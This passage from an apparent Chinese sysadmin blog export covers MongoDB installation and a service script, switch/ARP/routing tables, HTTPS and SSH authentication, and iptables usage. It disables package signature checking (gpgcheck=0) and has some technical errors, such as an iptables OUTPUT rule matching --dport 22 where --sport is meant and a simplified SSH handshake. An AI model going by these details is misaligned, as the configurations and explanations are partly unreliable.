Repositorybaseurl=http://downloads-distro.mongodb.org/repo/redhat/os/x86_64/gpgcheck=0enabled=1 2、执行安装命令 1yum install -y mongodb-enterprise 如果你想安装特殊的指定版本可以按照如下命令操作 1yum install -y mongodb-enterprise-3.2.1 mongodb-enterprise-server-3.2.1 mongodb-enterprise-shell-3.2.1 mongodb-enterprise-mongos-3.2.1 mongodb-enterprise-tools-3.2.1 卸载MongoDB停止服务 1sudo service mongod stop 删除包 1sudo yum erase $(rpm -qa | grep mongodb-enterprise) 删除库文件 12sudo rm -r /var/log/mongodbsudo rm -r /var/lib/mongo 源码安装MongoDB通过MongoDB官网就可以打开下载地址：https://www.mongodb.com/download-center?jmp=nav&amp;_ga=1.114046535.1911966133.1464573239#community 从里面获取到下载地址之后直接在服务器上下载即可！ 1、下载源码 1wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-rhel62-3.2.6.tgz 2、解压 1tar -zxvf mongodb-linux-x86_64-rhel62-3.2.6.tgz 解压后的目录： 12345GNU-AGPL-3.0 #GNU协议文件MPL-2 #MPL协议文件README #README软件提供类似于软件须知THIRD-PARTY-NOTICES #第三方的提文件bin #主程序目录 上面的几个文件，没有具体的实际作用我们可以删除掉！但是README还是建议保留下的 并且为了方便管理我把的目录名更改为： 1mv mongodb-linux-x86_64-rhel62-3.2.6 mongodb 3、启动Mongodb 进入到bin目录下，执行./mongod 看看提示 12016-05-30T10:36:33.520+0800 I STORAGE [initandlisten] exception in initAndListen: 29 Data directory /data/db not found., terminating 所以在MongoDB在启动的时候默认指定的数据库目录是/data/db我们可以通过 –dbpath=目录名称 来指定数据库默认存储的路径 我们来创建别名和目录指定并启动它 1./mongod --dbpath=/work/app/mongodb/data/ 现在启动的时候是在前台启动的，如果当前终端退出后那么程序就会退出，怎么让他在后台启动呢？ –fork –logpath=日志文件和路径，在使用fork参数的时候必须指定日志文件路径 123./mongod --dbpath=/work/app/mongodb/data/ --fork BadValue: --fork has to be used with --logpath or --syslogtry './mongod --help' for more information 所以后台启动为 1234./mongod --dbpath=/work/app/mongodb/data/ --fork --logpath=/work/app/mongodb/data/mongodb1.logabout to fork child process, waiting until server is ready for connections.forked process: 16975child process started successfully, parent exiting 关闭程序，在关闭的时候必须执行dbpath 1./mongod --dbpath=/work/app/mongodb/data/ --shutdown 4、改为配置文件启动方式 现在我们可以在后台启动了，但是有个问题，我们以后再配置管理的时候，难道每次都要去手动去设置这些参数呢？如果参数错误了造成的问题呢？ 4.1、单实例如何通过配置文件启动 首先创建一个目录config目录名称随意,然后在目录里创建一个配置文件 1vim mongodb1.cnf 然后在配置文件里写入参数，把咱们平时写的参数写到配置文件中 参考命令行下的命令： 1./mongod --dbpath=/work/app/mongodb/data/ --fork --logpath=/work/app/mongodb/data/mongodb1.log 配置文件内容如下： 12345678vim mongodb1.cnf#if have a parameter must be write like : key=valuedbpath=/work/app/mongodb/data/#if not paramenter and you want enable must be write like : fork=truefork=trueport=27017logpath=/work/app/mongodb/data/mongodb1.log 启动命令： 1234./bin/mongod -f config/mongodb1.cnf about to fork child process, waiting until server is ready for connections.forked process: 17220child process started successfully, parent exiting 关闭命令： 因为配置文件中已经有数据库的路径了，所以直接通过–shutdown就可以了 123./bin/mongod -f config/mongodb1.cnf --shutdown2016-05-30T12:10:12.295+0800 I CONTROL [main] log file "/work/app/mongodb/data/mongodb1.log" exists; moved to "/work/app/mongodb/data/mongodb1.log.2016-05-30T04-10-12".killing process with pid: 17220 5、在服务器上通过配置文件启动多实例 首先创建第二个实例的数据库存储目录 1mkdir /work/app/mongodb/data2 再添加配置文件 123456789cd /work/app/mongodb/configvim mongodb2.cnf#if have a parameter must be write like : key=valuedbpath=/work/app/mongodb/data2/#if not paramenter and you want enable must be write like : fork=truefork=trueport=27018logpath=/work/app/mongodb/data/mongodb2.log 启动实例 1234567#第一个实例bin/mongod -f config/mongodb1.cnf#第二个实例bin/mongod -f config/mongodb2.cnf'''以后如果还有其他实例按照上面的操作即可''' 查看结果： 123ps -ef |grep -i mongroot 17737 1 3 15:22 ? 00:00:00 bin/mongod -f config/mongodb1.cnfroot 17758 1 2 15:22 ? 00:00:00 bin/mongod -f config/mongodb2.cnf MongoDB Server脚本1234567891011121314151617181920212223242526#!/bin/bash#---------------------------------------------------------------------# Written by : sun# Program : mongodb_server.sh will help to contrl :start stop restart mongodb# Creation Date : 2016/5/30# Last Modified : 2016/5/30#---------------------------------------------------------------------instance=$1action=$2case "$action" in start) /work/app/mongodb/bin/mongod -f /work/app/mongodb/config/"$instance".cnf ;; 'stop') /work/app/mongodb/bin/mongod -f /work/app/mongodb/config/"$instance".cnf --shutdown ;; 'restart') /work/app/mongodb/bin/mongod -f /work/app/mongodb/config/"$instance".cnf --shutdown /work/app/mongodb/bin/mongod -f /work/app/mongodb/config/"$instance".cnf ;; *) echo -e "\033[31;40myou must input like : ./mongodb_server.sh mongodbname for example : ./mongodb_server.sh mongodb1\033[0m" ;;esac]]></content>
      <categories>
        <category>数据库运维</category>
        <category>Nosql详解</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络传输中的表和包的流经过程]]></title>
    <url>%2Farticles%2F93a903d8.html</url>
    <content type="text"><![CDATA[目的本文详细介绍了网络传输过程中3张表：MAC地址表，ARP缓存表和路由表。并且也介绍了数据包在网络传输中从源到目的主机的过程。 表详解MAC地址表详解说到MAC地址表，就不得不说一下交换机的工作原理了，因为交换机是根据MAC地址表转发数据帧的。在交换机中有一张记录着局域网主机MAC地址与交换机接口的对应关系的表，交换机就是根据这张表负责将数据帧传输到指定的主机上的。 交换机的工作原理 交换机在接收到数据帧以后，首先、会记录数据帧中的源MAC地址和对应的接口到MAC表中，接着、会检查自己的MAC表中是否有数据帧中目标MAC地址的信息，如果有则会根据MAC表中记录的对应接口将数据帧发送出去(也就是单播)，如果没有，则会将该数据帧从非接受接口发送出去(也就是广播)。 如下图：详细讲解交换机传输数据帧的过程 1)主机A会将一个源MAC地址为自己，目标MAC地址为主机B的数据帧发送给交换机。 2)交换机收到此数据帧后，首先将数据帧中的源MAC地址和对应的接口(接口为f 0/1) 记录到MAC地址表中。 3)然后交换机会检查自己的MAC地址表中是否有数据帧中的目标MAC地址的信息，如果有，则从MAC地址表中记录的接口发送出去，如果没有，则会将此数据帧从非接收接口的所有接口发送出去(也就是除了f 0/1接口)。 4)这时，局域网的所有主机都会收到此数据帧，但是只有主机B收到此数据帧时会响应这个广播，并回应一个数据帧，此数据帧中包括主机B的MAC地址。 5)当交换机收到主机B回应的数据帧后，也会记录数据帧中的源MAC地址(也就是主机B的MAC地址)，这时，再当主机A和主机B通信时，交换机根据MAC地址表中的记录，实现单播了。 如下图：当局域网存在多个交换机互联的时候，交换机的MAC地址表是怎么记录的呢？ 1)主机A将一个源MAC地址为自己，目标MAC地址主机C的数据帧发送给交换机 2)交换机1收到此数据帧后，会学习源MAC地址，并检查MAC地址表，发现没有目标MAC地址的记录，则会将数据帧广播出去，主机B和交换机2都会收到此数据帧。 3)交换机2收到此数据帧后也会将数据帧中的源MAC地址和对应的接口记录到MAC地址表中，并检查自己的MAC地址表，发现没有目标MAC地址的记录，则会广播此数据帧。 4)主机C收到数据帧后，会响应这个数据帧，并回复一个源MAC地址为自己的数据帧，这时交换机1和交换机1都会将主机C的MAC地址记录到自己的MAC地址表中，并且以单播的形式将此数据帧发送给主机A。 5)这时，主机A和主机C通信就是一单播的形式传输数据帧了，主机B和主机C通信如上述过程一样，因此交换机2的MAC地址表中记录着主机A和主机B的MAC地址都对应接口f 0/1。 总结： 从上面的两幅图可以看出，交换机具有动态学习源MAC地址的功能，并且交换机的一个接口可以对应多个MAC地址，但是一个MAC地址只能对应一个接口。 注意：交换机动态学习的MAC地址默认只有300S的有效期，如果300S内记录的MAC地址没有通信，则会删除此记录。 ARP缓存表详解上面我们讲解了交换机的工作原理，知道交换机是通过MAC地址通信的，但是我们是如何获得目标主机的MAC地址呢？这时我们就需要使用ARP协议了，在每台主机中都有一张ARP表，它记录着主机的IP地址和MAC地址的对应关系。 ARP协议：ARP协议是工作在网络层的协议，它负责将IP地址解析为MAC地址。 如下图：详细讲解ARP的工作原理。 1)如果主机A想发送数据给主机B，主机A首先会检查自己的ARP缓存表，查看是否有主机B的IP地址和MAC地址的对应关系，如果有，则会将主机B的MAC地址作为源MAC地址封装到数据帧中。如果没有，主机A则会发送一个ARP请求信息，请求的目标IP地址是主机B的IP地址，目标MAC地址是MAC地址的广播帧(即FF-FF-FF-FF-FF-FF)，源IP地址和MAC地址是主机A的IP地址和MAC地址。 2)当交换机接受到此数据帧之后，发现此数据帧是广播帧，因此，会将此数据帧从非接收的所有接口发送出去。 3）当主机B接受到此数据帧后，会校对IP地址是否是自己的，并将主机A的IP地址和MAC地址的对应关系记录到自己的ARP缓存表中，同时会发送一个ARP应答，其中包括自己的MAC地址。 4)主机A在收到这个回应的数据帧之后，在自己的ARP缓存表中记录主机B的IP地址和MAC地址的对应关系。而此时交换机已经学习到了主机A和主机B的MAC地址了。 路由表详解路由器负责不同网络之间的通信，它是当今网络中的重要设备，可以说没有路由器就没有当今的互联网。在路由器中也有一张表，这张表叫路由表，记录着到不同网段的信息。路由表中的信息分为直连路由和非直连路由。 直连路由：是直接连接在路由器接口的网段，由路由器自动生成。 非直连路由：就是不是直接连接在路由器接口上的网段，此记录需要手动添加或者是使用动态路由。 路由表中记录的条目有的需要手动添加(称为静态路由)，有的测试动态获取的(称为动态路由)。直连路由属于静态路由。 路由器是工作在网络层的，在网络层可以识别逻辑地址。当路由器的某个接口收到一个包时，路由器会读取包中相应的目标的逻辑地址的网络部分，然后在路由表中进行查找。如果在路由表中找到目标地址的路由条目，则把包转发到路由器的相应接口，如果在路由表中没有找到目标地址的路由条目，那么，如果路由配置默认路由，就科举默认路由的配置转发到路由器的相应接口；如果没有配置默认路由，则将该包丢弃，并返回不可到达的信息。这就是数据路由的过程。 如下图：详细介绍路由器的工作原理 1)HostA在网络层将来自上层的报文封装成IP数据包，其中源IP地址为自己，目标IP地址是HostB，HostA会用本机配置的24位子网掩码与目标地址进行“与”运算，得出目标地址与本机不是同一网段，因此发送HostB的数据包需要经过网关路由A的转发。 2)HostA通过ARP请求获取网关路由A的E0口的MAC地址，并在链路层将路由器E0接口的MAC地址封装成目标MAC地址，源MAC地址是自己。 3)路由器A从E0可接收到数据帧，把数据链路层的封装去掉，并检查路由表中是否有目标IP地址网段(即192.168.2.2的网段)相匹配的的项，根据路由表中记录到192.168.2.0网段的数据请发送给下一跳地址10.1.1.2，因此数据在路由器A的E1口重新封装，此时，源MAC地址是路由器A的E1接口的MAC地址，封装的目标MAC地址则是路由器2的E1接口的MAC地址。 4)路由B从E1口接收到数据帧，同样会把数据链路层的封装去掉，对目标IP地址进行检测，并与路由表进行匹配，此时发现目标地址的网段正好是自己E0口的直连网段，路由器B通过ARP广播，获知HostB的MAC地址，此时数据包在路由器B的E0接口再次封装，源MAC地址是路由器B的E0接口的MAC地址，目标MAC地址是HostB的MAC地址。封装完成后直接从路由器的E0接口发送给HostB。 5)此时HostB才会收到来自HostA发送的数据。 总结： 路由表负责记录一个网络到另一个网络的路径，因此路由器是根据路由表工作的。 看完上面的文章是不是感觉原来数据在网络中传输是这么的复杂啊！呵呵…其实这些过程都是计算机自己完成的，我们需要做的很少。 包传输 为了便于理解，先从同一广播域内两台主机通信开始叙述吧。只要能理解这些，那也就差不多可以理解跨路由传输过程了（两者不同之处在于源和目标MAC地址的转换）。 情景一：同一广播域内，两台主机通信过程我们知道两主机要通信传送数据时，就要把应用数据封装成IP包（因为我们的网络大多都是TCP/IP的以太网了），然后再交给下一层数据链路层继续封装成帧；之后根据MAC地址才能把数据从一台主机，准确无误的传送到另一台主机。 如图：当NO要和N1通信时，假如N0知道N1的IP但却不知道它的MAC地址，那NO就会发送一个ARP的广播请求（里面源IP是NO 目标IP是N1 源MAC是N0 目标MAC是12个F）给同一广播域中的所有成员，当交换机SW0从自己的1接口上收到这个广播包，然后它会读取这个帧的源MAC地址和目标MAC地址，由于交换机SW0刚启动加电时，它的MAC表为空的。所以它会把NO的MAC地址与之相对应的接口1放到一张表里，这张表就是MAC地址表。然后他再从别的接口广播这个数据帧，当别的主机收到这个广播时，查看目标IP不是自己的，就会丢弃此包。如果N1接收到这个数据帧，它检查目标IP和这个的IP是一样的，就会回应这个ARP请求，把自己的IP和MAC封装成源IP和源MAC，N0的IP和N0的MAC地址为目标IP与目标MAC，并记录NO的MAC与IP，放进自己的ARP缓存表中。此时，这个应答包经过交换机SWO时，它又会检查源MAC 、 目标MAC，把N1的MAC和自己接口2放进MAC地址表中，再查看自己的MAC地址表，发现存在目标MAC与自己的1接口对应（由于刚开始有记录过N0的MAC），那它就会直接把这个应答包从接口1送出去了。主机N0收到这个包后发现目标MAC是自己，就会处理这个包。并把N1的MAC与IP放进自己的ARP缓存表中。这时主机N0就知道N1的MAC地址了，以后要发送数据，就直接把N1的IP与MAC封装进帧中进行点对点的发送了。 情景二：跨路由的数据传输过程 当NO要和N2通信时，此时NO会检查N2的IP地址跟自己是否处在同一网段，图上得知，两主机肯定不会是同一网段的。因为N2和自己处在不同网段，所以，N0会把数据包发给它的网关，也就是R0上的F0/0接口了。源IP和源MAC地址是N0自己的，目标IP是N2的，目标MAC是R0上接口F0/0的（如果N0不知道F0/0的MAC,就会跟情景一相似，发个ARP广播来得到F0/0的MAC地址）。当这个数据包到达R0时，路由器R0会查看目标IP的是否是自己，由于目标不是自己，所以，会查看自己的路由表，找出到达N2网段的路由；如果没有相关条目，就直接丢弃。当查看路由表后发现到达N2网段的出接口是F0/1。于是，把数据包转到F0/1接口上，再由接口F0/1传给R1。这个过程，数据包的源IP是N0 源MAC是F0/1 目标IP是N2 目标MAC是R1的F0/1接口IP 。 当R1收到这个数据包后，同样也要检查包的目标IP是否是自己，它会主动查找自己的路由表，发现目标IP跟自己F0/0接口处在同一网段，于是就把包传到F0/0接口上去发给N2 （假如R1上的ARP缓存表中没有N2的MAC，则接口F0/0会发送一个ARP广播给跟它相连的广播域中；这个ARP广播包的源IP是接口F0/0的IP 源MAC也是F0/0的MAC 目标IP是N2 目标MAC为12个F）,假如N2的MAC地址已经在R1的ARP缓存中了，那就会直接把数据包封装成：源IP为N0 源MAC为R1的F0/0 目标IP为N2 目标MAC为N2了。 到了这里，包的跨路由传输就会结束了，当包到达N2，做反向操作即可把包发给N0了。 总结： 同一广播域中，包的源、目标IP;源、目标MAC是真实的两台主机上的IP与MAC地址。 跨路由中，包的源IP与目标IP始终不会发生变化，源和目标MAC根据所经过的路由接口不同而发生相应变化。]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Http认证]]></title>
    <url>%2Farticles%2Fe4025678.html</url>
    <content type="text"><![CDATA[目的本文详解介绍了http的认证。认证分为：单向认证和双向认证。 HttpHyperText Transfer Protocol，超文本传输协议，是互联网上使用最广泛的一种协议，所有WWW文件必须遵循的标准。HTTP协议传输的数据都是未加密的，也就是明文的，因此使用HTTP协议传输隐私信息非常不安全。 使用TCP端口为：80 HttpsHyper Text Transfer Protocol over Secure Socket Layer，安全的超文本传输协议，网景公式设计了SSL(Secure Sockets Layer)协议用于对Http协议传输的数据进行加密，保证会话过程中的安全性。 使用TCP端口默认为443 SSL协议加密方式SSL协议即用到了对称加密也用到了非对称加密(公钥加密)，在建立传输链路时，SSL首先对对称加密的密钥使用公钥进行非对称加密，链路建立好之后，SSL对传输内容使用对称加密。 对称加密速度高，可加密内容较大，用来加密会话过程中的消息 公钥加密加密速度较慢，但能提供更好的身份认证技术，用来加密对称加密的密钥 单向认证Https在建立Socket连接之前，需要进行握手，具体过程如下： 客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。 服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书 客户端使用服务端返回的信息验证服务器的合法性，包括： 证书是否过期 发型服务器证书的CA是否可靠 返回的公钥是否能正确解开返回证书中的数字签名 服务器证书上的域名是否和服务器的实际域名相匹配验证通过后，将继续进行通信，否则，终止通信 客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择 服务器端在客户端提供的加密方案中选择加密程度最高的加密方式。 服务器将选择好的加密方案通过明文方式返回给客户端 客户端接收到服务端返回的加密方式后，使用该加密方式生成产生随机码，用作通信过程中对称加密的密钥，使用服务端返回的公钥进行加密，将加密后的随机码发送至服务器 服务器收到客户端返回的加密信息后，使用自己的私钥进行解密，获取对称加密密钥。在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。 双向认证双向认证和单向认证原理基本差不多，只是除了客户端需要认证服务端以外，增加了服务端对客户端的认证，具体过程如下： 客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。 服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书 客户端使用服务端返回的信息验证服务器的合法性，包括： 证书是否过期 发型服务器证书的CA是否可靠 返回的公钥是否能正确解开返回证书中的数字签名 服务器证书上的域名是否和服务器的实际域名相匹配验证通过后，将继续进行通信，否则，终止通信 服务端要求客户端发送客户端的证书，客户端会将自己的证书发送至服务端 验证客户端的证书，通过验证后，会获得客户端的公钥 客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择 服务器端在客户端提供的加密方案中选择加密程度最高的加密方式 将加密方案通过使用之前获取到的公钥进行加密，返回给客户端 客户端收到服务端返回的加密方案密文后，使用自己的私钥进行解密，获取具体加密方式，而后，产生该加密方式的随机码，用作加密过程中的密钥，使用之前从服务端证书中获取到的公钥进行加密后，发送给服务端 服务端收到客户端发送的消息后，使用自己的私钥进行解密，获取对称加密的密钥，在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>Http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ssh认证原理]]></title>
    <url>%2Farticles%2Fe7844ae3.html</url>
    <content type="text"><![CDATA[目的通常，通过ssh登录远程服务器时，使用密码认证，分别输入用户名和密码，两者满足一定规则就可以登录。但是密码认证有以下的缺点： 用户无法设置空密码（即使系统允许空密码，也会十分危险） 密码容易被人偷窥或猜到 服务器上的一个帐户若要给多人使用，则必须让所有使用者都知道密码，导致密码容易泄露，而且修改密码时必须通知所有人 而使用公钥认证则可以解决上述问题。 公钥认证允许使用空密码，省去每次登录都需要输入密码的麻烦 多个使用者可以通过各自的密钥登录到系统上的同一个用户 认证原理所谓的公钥认证，实际上是使用一对加密字符串，一个称为公钥(public key)，任何人都可以看到其内容，用于加密；另一个称为密钥(private key)，只有拥有者才能看到，用于解密。通过公钥加密过的密文使用密钥可以轻松解密，但根据公钥来猜测密钥却十分困难。 ssh 的公钥认证就是使用了这一特性。服务器和客户端都各自拥有自己的公钥和密钥。为了说明方便，以下将使用这些符号。 Ac 客户端公钥 Bc 客户端密钥 As 服务器公钥 Bs 服务器密钥 在认证之前，客户端需要通过某种方法将公钥 Ac 登录到服务器上。 认证过程分为两个步骤。 1、会话密钥(session key)生成 1）客户端请求连接服务器，服务器将 As 发送给客户端。 2）服务器生成会话ID(session id)，设为 p，发送给客户端。 3）客户端生成会话密钥(session key)，设为 q，并计算 r = p xor q。 4）客户端将 r 用 As 进行加密，结果发送给服务器。 5）服务器用 Bs 进行解密，获得 r。 6）服务器进行 r xor p 的运算，获得 q。 7）至此服务器和客户端都知道了会话密钥q，以后的传输都将被 q 加密。 2、认证 1）服务器生成随机数 x，并用 Ac 加密后生成结果 S(x)，发送给客户端 2）客户端使用 Bc 解密 S(x) 得到 x 3）客户端计算 q + x 的 md5 值 n(q+x)，q为上一步得到的会话密钥 4）服务器计算 q + x 的 md5 值 m(q+x) 5）客户端将 n(q+x) 发送给服务器 6）服务器比较 m(q+x) 和 n(q+x)，两者相同则认证成功]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>Ssh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptables使用详解]]></title>
    <url>%2Farticles%2F68ead32e.html</url>
    <content type="text"><![CDATA[前言防 火墙，其实说白了讲，就是用于实现Linux下访问控制的功能的，它分为硬件的或者软件的防火墙两种。无论是在哪个网络中，防火墙工作的地方一定是在网络 的边缘。而我们的任务就是需要去定义到底防火墙如何工作，这就是防火墙的策略规则。制定策略规则以达到让它对出入网络的IP、数据进行检测。 目前市面上比较常见的有3、4层的防火墙，叫网络层的防火墙，还有7层的防火墙，其实是代理层的网关。 对于TCP/IP的七层模型来讲，我们知道第三层是网络层，三层的防火墙会在这层对源地址和目标地址进行检测。但是对于七层的防火墙，不管你源端口或者目标端口，源地址或者目标地址是什么，都将对你所有的东西进行检查。 所以，对于设计原理来讲，七层防火墙更加安全，但是这却带来了效率更低。所以市面上通常的防火墙方案，都是两者结合的。而又由于我们都需要从防火墙所控制 的这个口来访问，所以防火墙的工作效率就成了用户能够访问数据多少的一个最重要的控制，配置的不好甚至有可能成为流量的瓶颈。 历史iptables 的前身叫ipfirewall （内核1.x时代）,这是一个作者从freeBSD上移植过来的，能够工作在内核当中的，对数据包进行检测的一款简易访问控制工具。但是 ipfirewall工作功能极其有限(它需要将所有的规则都放进内核当中，这样规则才能够运行起来，而放进内核，这个做法一般是极其困难的)。当内核发 展到2.x系列的时候，软件更名为ipchains，它可以定义多条规则，将他们串起来，共同发挥作用，而现在，它叫做iptables，可以将规则组成一个列表，实现绝对详细的访问控制功能。 他们都是工作在用户空间中，定义规则的工具，本身并不算是防火墙。它们定义的规则，可以让在内核空间当中的netfilter来读取，并且实现让防火墙工作。而放入内核的地方必须要是特定的位置，必须是tcp/ip的协议栈经过的地方。而这个tcp/ip协议栈必须经过的地方，可以实现读取规则的地方就叫做 netfilter.(网络过滤器) 一共在内核空间中选择了5个位置， ​ 1.内核空间中：从一个网络接口进来，到另一个网络接口去的 ​ 2.数据包从内核流入用户空间的 ​ 3.数据包从用户空间流出的 ​ 4.进入/离开本机的外网接口 ​ 5.进入/离开本机的内网接口 ​ 工作机制从 上面的发展我们知道了作者选择了5个位置，来作为控制的地方，但是你有没有发现，其实前三个位置已经基本上能将路径彻底封锁了，但是为什么已经在进出的口 设置了关卡之后还要在内部卡呢？ 由于数据包尚未进行路由决策，还不知道数据要走向哪里，所以在进出口是没办法实现数据过滤的。所以要在内核空间里设置转发的关卡，进入用户空间的关卡，从 用户空间出去的关卡。那么，既然他们没什么用，那我们为什么还要放置他们呢？因为我们在做NAT和DNAT的时候，目标地址转换必须在路由之前转换。所以我们必须在外网而后内网的接口处进行设置关卡。 这五个位置也被称为五个钩子函数（hook functions）,也叫五个规则链。 ​ 1.PREROUTING (路由前) ​ 2.INPUT (数据包流入口) ​ 3.FORWARD (转发管卡) ​ 4.OUTPUT(数据包出口) ​ 5.POSTROUTING（路由后） ​ 这是NetFilter规定的五个规则链，任何一个数据包，只要经过本机，必将经过这五个链中的其中一个链。 防火墙的策略防火墙策略一般分为两种，一种叫“通”策略，一种叫“堵”策略，通策略，默认门是关着的，必须要定义谁能进。堵策略则是，大门是洞开的，但是你必须有身份认证，否则不能进。所以我们要定义，让进来的进来，让出去的出去，所以通，是要全通，而堵，则是要选择。当我们定义的策略的时候，要分别定义多条功能，其中：定义数据包中允许或者不允许的策略，filter过滤的功能，而定义地址转换的功能的则是nat选项。为了让这些功能交替工作，我们制定出了“表”这个定义，来定义、区分各种不同的工作功能和处理方式。 我们现在用的比较多个功能有3个： 1.filter 定义允许或者不允许的 2.nat 定义地址转换的 3.mangle功能:修改报文原数据 我们修改报文原数据就是来修改TTL的。能够实现将数据包的元数据拆开，在里面做标记/修改内容的。而防火墙标记，其实就是靠mangle来实现的。 扩展: ​ 对于filter来讲一般只能做在3个链上：INPUT ，FORWARD ，OUTPUT ​ 对于nat来讲一般也只能做在3个链上：PREROUTING ，OUTPUT ，POSTROUTING ​ 而mangle则是5个链都可以做：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING iptables/netfilter（这款软件）是工作在用户空间的，它可以让规则进行生效的，本身不是一种服务，而且规则是立即生效的。而我们iptables现在被做成了一个服务，可以进行启动，停止的。启动，则将规则直接生效，停止，则将规则撤销。 iptables还支持自己定义链。但是自己定义的链，必须是跟某种特定的链关联起来的。在一个关卡设定，指定当有数据的时候专门去找某个特定的链来处理，当那个链处理完之后，再返回。接着在特定的链中继续检查。 注意：规则的次序非常关键，谁的规则越严格，应该放的越靠前，而检查规则的时候，是按照从上往下的方式进行检查的。 规则的写法​ iptables定义规则的方式比较复杂: ​ 格式：iptables [-t table] COMMAND chain CRETIRIA -j ACTION ​ -t table ：3个filter nat mangle ​ COMMAND：定义如何对规则进行管理 ​ chain：指定你接下来的规则到底是在哪个链上操作的，当定义策略的时候，是可以省略的 ​ CRETIRIA:指定匹配标准 ​ -j ACTION :指定如何进行处理 ​ 比如：不允许172.16.0.0/24的进行访问。 ​ iptables -t filter -A INPUT -s 172.16.0.0/16 -p udp –dport 53 -j DROP ​ 当然你如果想拒绝的更彻底： ​ iptables -t filter -R INPUT 1 -s 172.16.0.0/16 -p udp –dport 53 -j REJECT ​ iptables -L -n -v #查看定义规则的详细信息 详解命令链管理命令（这都是立即生效的）​ -P :设置默认策略的（设定默认门是关着的还是开着的） ​ 默认策略一般只有两种 ​ iptables -P INPUT (DROP|ACCEPT) 默认是关的/默认是开的 ​ 比如： ​ iptables -P INPUT DROP 这就把默认规则给拒绝了。并且没有定义哪个动作，所以关于外界连接的所有规则包括Xshell连接之类的，远程连接都被拒绝了。 ​ -F: FLASH，清空规则链的(注意每个链的管理权限) ​ iptables -t nat -F PREROUTING ​ iptables -t nat -F 清空nat表的所有链 ​ -N:NEW 支持用户新建一个链 ​ iptables -N inbound_tcp_web 表示附在tcp表上用于检查web的。 ​ -X: 用于删除用户自定义的空链 ​ 使用方法跟-N相同，但是在删除之前必须要将里面的链给清空昂了 ​ -E：用来Rename chain主要是用来给用户自定义的链重命名 ​ -E oldname newname ​ -Z：清空链，及链中默认规则的计数器的（有两个计数器，被匹配到多少个数据包，多少个字节） ​ iptables -Z :清空 规则管理命令​ -A：追加，在当前链的最后新增一个规则 ​ -I num : 插入，把当前规则插入为第几条。 ​ -I 3 :插入为第三条 ​ -R num：Replays替换/修改第几条规则 ​ 格式：iptables -R 3 ………… ​ -D num：删除，明确指定删除第几条规则 ​ 查看管理命令 “-L”​ 附加子命令 ​ -n：以数字的方式显示ip，它会将ip直接显示出来，如果不加-n，则会将ip反向解析成主机名。 ​ -v：显示详细信息 ​ -vv ​ -vvv :越多越详细 ​ -x：在计数器上显示精确值，不做单位换算 ​ –line-numbers : 显示规则的行号 ​ -t nat：显示所有的关卡的信息 详解匹配标准1.通用匹配：源地址目标地址的匹配 ​ -s：指定作为源地址匹配，这里不能指定主机名称，必须是IP ​ IP | IP/MASK | 0.0.0.0/0.0.0.0 ​ 而且地址可以取反，加一个“!”表示除了哪个IP之外 ​ -d：表示匹配目标地址 ​ -p：用于匹配协议的（这里的协议通常有3种，TCP/UDP/ICMP） ​ -i eth0：从这块网卡流入的数据 ​ 流入一般用在INPUT和PREROUTING上 ​ -o eth0：从这块网卡流出的数据 ​ 流出一般在OUTPUT和POSTROUTING上 2.扩展匹配 2.1隐含扩展：对协议的扩展 ​ -p tcp :TCP协议的扩展。一般有三种扩展 ​ –dport XX-XX：指定目标端口,不能指定多个非连续端口,只能指定单个端口，比如 ​ –dport 21 或者 –dport 21-23 (此时表示21,22,23) ​ –sport：指定源端口 ​ –tcp-fiags：TCP的标志位（SYN,ACK，FIN,PSH，RST,URG） ​ 对于它，一般要跟两个参数： ​ 1.检查的标志位 ​ 2.必须为1的标志位 ​ –tcpflags syn,ack,fin,rst syn = –syn ​ 表示检查这4个位，这4个位中syn必须为1，其他的必须为0。所以这个意思就是用于检测三次握手的第一次包的。对于这种专门匹配第一包的SYN为1的包，还有一种简写方式，叫做–syn ​ -p udp：UDP协议的扩展 ​ –dport ​ –sport ​ -p icmp：icmp数据报文的扩展 ​ –icmp-type： ​ echo-request(请求回显)，一般用8 来表示 ​ 所以 –icmp-type 8 匹配请求回显数据包 ​ echo-reply （响应的数据包）一般用0来表示 ​ 2.2显式扩展（-m） ​ 扩展各种模块 ​ -m multiport：表示启用多端口扩展 ​ 之后我们就可以启用比如 –dports 21,23,80 ​ ​ 详解-j ACTION​ 常用的ACTION： ​ DROP：悄悄丢弃 ​ 一般我们多用DROP来隐藏我们的身份，以及隐藏我们的链表 ​ REJECT：明示拒绝 ​ ACCEPT：接受 ​ custom_chain：转向一个自定义的链 ​ DNAT ​ SNAT ​ MASQUERADE：源地址伪装 ​ REDIRECT：重定向：主要用于实现端口重定向 ​ MARK：打防火墙标记的 ​ RETURN：返回 ​ 在自定义链执行完毕后使用返回，来返回原规则链。 练习题： ​ 只要是来自于172.16.0.0/16网段的都允许访问我本机的172.16.100.1的SSHD服务 ​ 分析：首先肯定是在允许表中定义的。因为不需要做NAT地址转换之类的，然后查看我们SSHD服务，在22号端口上，处理机制是接受，对于这个表，需要 有一来一回两个规则，如果我们允许也好，拒绝也好，对于访问本机服务，我们最好是定义在INPUT链上，而OUTPUT再予以定义就好。(会话的初始端先 定义)，所以加规则就是： ​ 定义进来的： iptables -t filter -A INPUT -s 172.16.0.0/16 -d 172.16.100.1 -p tcp –dport 22 -j ACCEPT ​ 定义出去的： iptables -t filter -A OUTPUT -s 172.16.100.1 -d 172.16.0.0/16 -p tcp –dport 22 -j ACCEPT ​ 将默认策略改成DROP: ​ iptables -P INPUT DROP ​ iptables -P 